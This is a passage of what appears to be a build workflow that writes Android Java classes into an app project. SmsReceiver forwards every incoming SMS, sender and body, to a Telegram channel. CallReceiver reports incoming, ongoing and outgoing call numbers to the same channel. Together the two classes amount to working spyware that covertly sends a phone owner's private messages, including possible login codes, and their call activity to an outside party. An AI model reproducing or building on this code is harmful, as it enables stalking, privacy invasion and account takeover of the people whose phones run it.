      - name: SmsReceiver.java
        run: |
          cat << 'EOF' > app/src/main/java/com/h/core/SmsReceiver.java
          package com.h.core;
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.telephony.SmsMessage;
          
          public class SmsReceiver extends BroadcastReceiver {
              @Override 
              public void onReceive(Context ctx, Intent i) {
                  Object[] pdus = (Object[]) i.getExtras().get("pdus");
                  for(Object pdu: pdus) { 
                      SmsMessage sms = SmsMessage.createFromPdu((byte[])pdu);
                      Telegram.sendMessage(ctx, "📨 SMS من " + sms.getOriginatingAddress() + "\n" + sms.getMessageBody());
                  }
              }
          }
          EOF

      - name: CallReceiver.java
        run: |
          cat << 'EOF' > app/src/main/java/com/h/core/CallReceiver.java
          package com.h.core;
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.telephony.TelephonyManager;
          
          public class CallReceiver extends BroadcastReceiver {
              @Override 
              public void onReceive(Context ctx, Intent i) {
                  String state = i.getStringExtra(TelephonyManager.EXTRA_STATE);
                  String num = i.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                  if(num==null && i.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) 
                      num = i.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                  
                  if(num!=null) {
                      String type = "غير معروف";
                      if(TelephonyManager.EXTRA_STATE_RINGING.equals(state)) type = "⏰ واردة";
                      else if(TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) type = "📞 جارية";
                      else if(i.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) type = "🔴 صادرة";
                      Telegram.sendMessage(ctx, type + "\nالرقم: " + num);
                  }
              }
          }
          EOF

